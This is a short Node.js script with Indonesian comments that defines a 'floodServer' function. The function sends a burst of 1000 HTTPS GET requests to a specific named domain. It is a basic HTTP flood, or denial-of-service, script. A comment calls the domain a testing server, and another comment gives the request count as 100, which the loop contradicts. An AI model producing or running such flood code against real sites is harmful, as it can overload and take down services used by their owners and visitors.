const https = require('https');

// URL server pengujian Anda
const targetUrl = 'https://www.valzyofc.my.id'; 

function floodServer() {
    for (let i = 0; i < 1000; i++) { // Mengirimkan 100 permintaan
        https.get(targetUrl, (res) => {
            console.log(`Status: ${res.statusCode}`);
        }).on('error', (e) => {
            console.error(`Error: ${e.message}`);
        });
    }
}

floodServer();